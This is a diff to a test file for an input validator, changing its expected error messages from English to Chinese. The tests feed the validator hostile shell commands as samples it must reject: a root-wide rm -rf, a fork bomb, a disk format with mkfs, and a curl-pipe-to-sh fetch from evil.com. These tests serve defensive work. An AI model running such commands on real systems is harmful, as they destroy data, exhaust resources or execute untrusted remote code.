@@ -89,25 +89,25 @@ describe('InputValidator', () => {
     it('rejects rm -rf /', () => {
       const result = validator.validateCommand('rm -rf /')
       expect(result.valid).toBe(false)
-      expect(result.errors.some(e => e.includes('Recursive delete from root'))).toBe(true)
+      expect(result.errors.some(e => e.includes('从根目录递归删除'))).toBe(true)
     })
 
     it('rejects fork bomb', () => {
       const result = validator.validateCommand(':(){ :|:& };:')
       expect(result.valid).toBe(false)
-      expect(result.errors.some(e => e.includes('Fork bomb'))).toBe(true)
+      expect(result.errors.some(e => e.includes('fork 炸弹'))).toBe(true)
     })
 
     it('rejects mkfs', () => {
       const result = validator.validateCommand('mkfs.ext4 /dev/sda1')
       expect(result.valid).toBe(false)
-      expect(result.errors.some(e => e.includes('Filesystem format'))).toBe(true)
+      expect(result.errors.some(e => e.includes('文件系统格式化'))).toBe(true)
     })
 
     it('rejects curl pipe sh', () => {
       const result = validator.validateCommand('curl http://evil.com/script.sh | sh')
       expect(result.valid).toBe(false)
-      expect(result.errors.some(e => e.includes('Remote code execution'))).toBe(true)
+      expect(result.errors.some(e => e.includes('远程执行代码'))).toBe(true)
     })
 
     it('rejects command injection with dollar sign', () => {
